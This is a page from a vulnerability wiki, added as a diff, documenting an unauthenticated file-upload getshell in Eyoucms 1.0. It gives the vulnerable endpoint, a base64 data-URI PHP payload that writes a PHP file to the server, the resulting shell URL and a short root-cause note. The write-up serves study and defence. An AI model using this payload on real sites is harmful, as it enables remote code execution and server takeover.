@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Eyoucms/Eyoucms%201.0%20%E5%89%8D%E5%8F%B0getshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Eyoucms 1.0 前台getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Eyoucms 1.0 \u524d\u53f0getshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u56db\u3001\u53c2\u8003\u94fe\u63a5", url: "#_5" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Eyoucms%201.3.5%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Eyoucms%201.3.5%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Eyoucms 1.3.5 后台getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../EyouCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../EyouCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        EyouCMS文件包含RCE漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="eyoucms-10-getshell">Eyoucms 1.0 前台getshell<a class="headerlink" href="#eyoucms-10-getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>官网：<a href="http://www.eyoucms.com/download/Cms下载地址">http://www.eyoucms.com/download/Cms下载地址</a>：<a href="http://www.eyoucms.com/eyoucms1.0.zip">http://www.eyoucms.com/eyoucms1.0.zip</a></p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>老样子：先讲如何利用</p>
+<div class="codehilite"><pre><span></span><code><span class="n">url</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">test</span><span class="o">.</span><span class="n">eyoucms1</span><span class="o">.</span><span class="mf">0.</span><span class="n">com</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">Uploadify</span><span class="o">/</span><span class="n">preview</span>
+
+<span class="err">构造</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span><span class="w"> </span><span class="n">phpinfo</span><span class="p">;</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/Eyoucms1.0%E5%89%8D%E5%8F%B0getshell/media/rId24.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="n">post</span><span class="o">:</span><span class="w"> </span><span class="n">data</span><span class="o">:</span><span class="n">image</span><span class="o">/</span><span class="n">php</span><span class="o">;</span><span class="n">base64</span><span class="o">,</span><span class="n">PD9waHAgcGhwaW5mbygpOw</span><span class="o">==</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/Eyoucms1.0%E5%89%8D%E5%8F%B0getshell/media/rId25.png" /></p>
+<p>Shell:
+<a href="http://test.eyoucms1.0.com/preview/ae85d74a721b0b8bd247bc31207a12e2.php">http://test.eyoucms1.0.com/preview/ae85d74a721b0b8bd247bc31207a12e2.php</a></p>
+<p><img alt="" src="../resource/Eyoucms1.0%E5%89%8D%E5%8F%B0getshell/media/rId26.png" /></p>
+<p><img alt="" src="../resource/Eyoucms1.0%E5%89%8D%E5%8F%B0getshell/media/rId27.png" /></p>
+<h3 id="_4">原理分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>漏洞文件： eyoucms1.0\application\api\controller\Uploadify.php漏洞函数：preview()</p>
+<p><img alt="" src="../resource/Eyoucms1.0%E5%89%8D%E5%8F%B0getshell/media/rId29.png" /></p>
+<p><img alt="" src="../resource/Eyoucms1.0%E5%89%8D%E5%8F%B0getshell/media/rId30.png" /></p>
+<p>这里我将每行有意义的代码都解释了一下帮助读者进行查看。</p>
+<p>而我刚开始时也思考了一下，这会不会是作者故意搞的后门？带着这个问题我去问了一下加的php群的一些程序员 他们很惊讶的
+表示data:image/ 居然还可以不是图片？好吧。到这里我就基本明白为什么这个漏洞会出现了，估计作者以为data:image/
+只能是图片。</p>
+<h2 id="_5">四、参考链接<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/kbh8mh">https://www.yuque.com/pmiaowu/bfgkkh/kbh8mh</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Eyoucms%201.3.5%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Eyoucms%201.3.5%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Eyoucms 1.3.5 后台getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../EyouCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../EyouCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        EyouCMS文件包含RCE漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
